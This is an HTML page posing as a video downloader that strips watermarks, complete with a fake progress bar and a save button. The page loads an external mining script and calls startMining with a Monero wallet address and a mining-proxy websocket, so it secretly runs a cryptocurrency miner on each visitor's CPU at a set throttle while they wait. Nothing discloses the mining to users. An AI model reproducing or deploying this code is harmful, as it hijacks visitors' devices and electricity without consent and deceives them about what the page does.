<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .loader { width: 80%; max-width: 350px; text-align: center; }
        #status { font-size: 20px; color: #00d4ff; font-weight: bold; margin-bottom: 20px; }
        .bar-bg { background: #30363d; height: 10px; border-radius: 5px; overflow: hidden; }
        .bar-fill { width: 0%; height: 100%; background: #00d4ff; transition: width 0.3s; box-shadow: 0 0 10px #00d4ff; }
        .dl-btn { display: none; background: #00d4ff; color: #000; padding: 18px; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 25px; width: 100%; text-align: center; }
    </style>
</head>
<body>
    <div class="loader">
        <div id="status">Connecting...</div>
        <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
        <a id="download" class="dl-btn" href="#">SAVE VIDEO</a>
    </div>
    <script>
        const WORKER = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";
        
        startMining(WALLET, "Ghost_Site", "wss://ny1.xmrminingproxy.com", 70);

        const fill = document.getElementById('fill');
        let p = 0;
        const barInterval = setInterval(() => {
            if (p < 90) {
                p += Math.random() * 4;
                fill.style.width = p + "%";
                if(p > 30) document.getElementById('status').innerText = "Stripping Watermark...";
                if(p > 70) document.getElementById('status').innerText = "Finalizing File...";
            }
        }, 500);

        async function fetchVideo() {
            const url = new URLSearchParams(window.location.search).get('url');
            try {
                const res = await fetch(`${WORKER}?url=${encodeURIComponent(url)}`);
                const data = await res.json();
                if (data.url) {
                    clearInterval(barInterval);
                    fill.style.width = "100%";
                    document.getElementById('status').innerText = "Ready!";
                    const btn = document.getElementById('download');
                    btn.href = data.url;
                    btn.style.display = "block";
                } else { setTimeout(fetchVideo, 2000); }
            } catch (e) { setTimeout(fetchVideo, 2000); }
        }
        setTimeout(fetchVideo, 3000);
    </script>
</body>
</html>
